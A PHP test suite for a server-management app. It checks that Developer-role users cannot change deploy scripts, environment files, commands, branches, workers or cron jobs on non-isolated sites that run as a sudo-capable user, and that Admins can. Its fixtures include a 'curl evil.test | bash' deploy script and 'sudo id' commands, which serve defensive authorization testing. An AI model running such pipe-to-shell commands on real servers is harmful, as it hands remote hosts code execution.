<?php

use App\Models\CronJob;
use App\Models\Server;
use App\Models\Site;
use App\Models\Team;
use App\Models\User;
use App\Models\Worker;
use Illuminate\Support\Facades\Queue;

/*
 * A site that isn't isolated runs as the server user, who can sudo. Choosing
 * what runs as that user is therefore limited to members who may have a shell
 * as it (Owners and Admins); Developers keep it for isolated sites only.
 */

beforeEach(function () {
    Queue::fake();

    $this->team = Team::factory()->create(['user_id' => User::factory()->create()->id]);
    $this->server = Server::factory()->forTeam($this->team)->active()->create();
    $this->site = Site::factory()->forServer($this->server)->create(['branch' => 'main']);
    $this->isolatedSite = Site::factory()->forServer($this->server)->isolated('site_shop')->create(['branch' => 'main']);
    $this->serverPath = "/{$this->team->slug}/servers/{$this->server->id}";

    $this->developer = User::factory()->developerOf($this->team)->create();
    $this->admin = User::factory()->adminOf($this->team)->create();
});

dataset('ways to choose what a site runs', [
    'the deploy script' => ['put', '/deploy-script', ['script' => 'curl evil.test | bash']],
    'the environment file' => ['put', '/environment', ['env_content' => 'MAIL_SENDMAIL_PATH=/tmp/evil']],
    'a command' => ['post', '/command-runs', ['command' => 'sudo id']],
    'the branch' => ['put', '', ['branch' => 'evil']],
]);

dataset('processes', [
    'a worker' => ['workers', ['name' => 'queue', 'command' => 'sudo id', 'numprocs' => 1]],
    'a cron job' => ['cron-jobs', ['command' => 'sudo id', 'frequency' => '* * * * *']],
]);

describe('developer', function () {
    it('cannot change what a site that is not isolated runs', function (string $method, string $path, array $payload) {
        $this->actingAs($this->developer)
            ->{$method}("{$this->serverPath}/sites/{$this->site->id}{$path}", $payload)
            ->assertForbidden();

        Queue::assertNothingPushed();
    })->with('ways to choose what a site runs');

    it('cannot change where a site that is not isolated gets its code', function (array $payload) {
        $this->actingAs($this->developer)
            ->put("{$this->serverPath}/sites/{$this->site->id}", $payload)
            ->assertForbidden();

        expect($this->site->fresh())
            ->repository->toBe($this->site->repository)
            ->auto_deploy->toBe($this->site->auto_deploy);
    })->with([
        'the repository' => [['repository' => 'evil/repo']],
        'auto-deploy' => [['auto_deploy' => true]],
    ]);

    it('can change what an isolated site runs', function (string $method, string $path, array $payload) {
        $this->actingAs($this->developer)
            ->{$method}("{$this->serverPath}/sites/{$this->isolatedSite->id}{$path}", $payload)
            ->assertRedirect()
            ->assertSessionHasNoErrors();
    })->with('ways to choose what a site runs');

    it('can still change settings that do not choose what a site that is not isolated runs', function () {
        $this->actingAs($this->developer)
            ->put("{$this->serverPath}/sites/{$this->site->id}", ['directory' => '/public_html'])
            ->assertRedirect();

        expect($this->site->fresh()->directory)->toBe('/public_html');
    });

    it('cannot create a site that is not isolated', function () {
        $this->actingAs($this->developer)
            ->post("{$this->serverPath}/sites", [
                'server_id' => $this->server->id,
                'domain' => 'unisolated.com',
                'isolated' => false,
            ])
            ->assertForbidden();

        $this->assertDatabaseMissing('sites', ['domain' => 'unisolated.com']);
    });

    it('can create an isolated site', function () {
        $this->actingAs($this->developer)
            ->post("{$this->serverPath}/sites", [
                'server_id' => $this->server->id,
                'domain' => 'isolated.com',
            ])
            ->assertRedirect()
            ->assertSessionHasNoErrors();

        expect(Site::where('domain', 'isolated.com')->firstOrFail()->isIsolated())->toBeTrue();
    });

    it('cannot create a process that runs as the server user', function (string $resource, array $payload, ?string $site) {
        $this->actingAs($this->developer)
            ->post("{$this->serverPath}/{$resource}", [
                ...$payload,
                'site_id' => $site ? $this->{$site}->id : null,
                'user' => 'artisan',
            ])
            ->assertForbidden();

        Queue::assertNothingPushed();
    })->with('processes')->with([
        'tied to no site' => [null],
        'tied to a site that is not isolated' => ['site'],
    ]);

    it('can create a process that runs as an isolated site\'s user', function (string $resource, array $payload) {
        $this->actingAs($this->developer)
            ->post("{$this->serverPath}/{$resource}", [
                ...$payload,
                'site_id' => $this->isolatedSite->id,
                'user' => 'site_shop',
            ])
            ->assertRedirect()
            ->assertSessionHasNoErrors();
    })->with('processes');

    it('cannot change a process that runs as the server user', function (string $resource, array $payload) {
        $process = $resource === 'workers'
            ? Worker::factory()->create(['server_id' => $this->server->id, 'user' => 'artisan', 'command' => 'php artisan queue:work'])
            : CronJob::factory()->create(['server_id' => $this->server->id, 'user' => 'artisan', 'command' => 'php artisan schedule:run']);

        $this->actingAs($this->developer)
            ->put("{$this->serverPath}/{$resource}/{$process->id}", [
                ...$payload,
                'site_id' => null,
                'user' => 'artisan',
            ])
            ->assertForbidden();

        expect($process->fresh()->command)->not->toBe('sudo id');
    })->with('processes');
});

describe('admin', function () {
    it('can change what a site that is not isolated runs', function (string $method, string $path, array $payload) {
        $this->actingAs($this->admin)
            ->{$method}("{$this->serverPath}/sites/{$this->site->id}{$path}", $payload)
            ->assertRedirect()
            ->assertSessionHasNoErrors();
    })->with('ways to choose what a site runs');

    it('can create a site that is not isolated', function () {
        $this->actingAs($this->admin)
            ->post("{$this->serverPath}/sites", [
                'server_id' => $this->server->id,
                'domain' => 'unisolated.com',
                'isolated' => false,
            ])
            ->assertRedirect()
            ->assertSessionHasNoErrors();

        expect(Site::where('domain', 'unisolated.com')->firstOrFail()->isIsolated())->toBeFalse();
    });

    it('can create a process that runs as the server user', function (string $resource, array $payload) {
        $this->actingAs($this->admin)
            ->post("{$this->serverPath}/{$resource}", [
                ...$payload,
                'site_id' => null,
                'user' => 'artisan',
            ])
            ->assertRedirect()
            ->assertSessionHasNoErrors();
    })->with('processes');
});
